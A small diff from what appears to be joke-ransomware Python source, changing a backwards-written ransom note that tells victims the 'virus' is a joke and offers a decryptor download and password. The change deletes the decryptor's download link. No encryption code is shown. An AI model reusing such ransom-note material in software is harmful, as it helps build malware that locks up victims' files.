@@ -80,7 +80,7 @@ class Main:
             f.write("""
 ====================================================================================================
 mmmmH :DROWSSAP ROTPYRCED
-gnirahs=psu?weiv/_o9TOecz5wpPQ03pGgklWJKRqlRzooHU1/d/elif/moc.elgoog.evird//:sptth :ETISBEW SIHT MORF ROTPYRCED EHT DAOLNWOD NAC UOY ,**GNIHTYNA YAP OT UOY T'NOD EW**
+//:sptth :ETISBEW SIHT MORF ROTPYRCED EHT DAOLNWOD NAC UOY ,**GNIHTYNA YAP OT UOY T'NOD EW**
 .DEMMACS %001 UOY ,TI NUR EROFEB SURIV A SI SIHT WONK T'NOD UOY FI ,EKOJ SI SURIV SIHT :GNINRAW
 ====================================================================================================
 
